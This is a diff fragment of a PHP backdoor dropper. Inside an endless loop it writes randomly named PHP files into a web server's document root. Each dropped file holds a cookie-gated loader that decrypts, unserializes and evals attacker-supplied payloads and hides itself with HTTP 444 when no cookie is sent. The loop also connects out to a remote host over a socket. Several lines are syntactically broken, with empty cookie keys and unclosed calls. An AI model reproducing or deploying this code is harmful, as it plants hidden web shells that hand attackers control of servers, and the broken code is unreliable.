@@ -244,8 +244,9 @@ while(1) {
                     $allowed_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
                     $dd = $_SERVER['DOCUMENT_ROOT']."/".substr(str_shuffle($allowed_chars), 0, rand(10,50)).".php";
                     if (!is_file($dd)) {
-                        $ESP = "unserialize(base64_decode(sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(base64_decode(\$v[3]), hex2bin(\$v[2]), hex2bin(\$v[0]), hex2bin(\$v[1]))), ['allowed_classes' => false]);";
-                        fputs(fopen("{$dd}", "w"), "\<?php\n{$ESP} eval(\nopenssl_decrypt(gzdecode(".UNPACKSELF."), )");
+                        $ESP = "if (!empty(\$_COOKIE[''])){\nopenssl_decrypt(\$_COOKIE['']\n\$v=\$_COOKIE[''];\nunserialize(base64_decode(sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(base64_decode(\$v[3]), hex2bin(\$v[2]), hex2bin(\$v[0]), hex2bin(\$v[1]))), ['allowed_classes' => false]);\n}else{\nhttp_response_code(444);\n}\n}";
+                        fputs(fopen("{$dd}", "w+"), "<?php");
+                        fputs(fopen("{$dd}", "a"), "\n{$ESP} eval(openssl_decrypt(gzdecode(".UNPACKSELF."), )");
                     }
                     $fp = fsockopen("$ho", $p, $errno, $errstr, 180);
                     switch (fread(fopen(sys_get_temp_dir() . "/aa", "r"), 3)) {
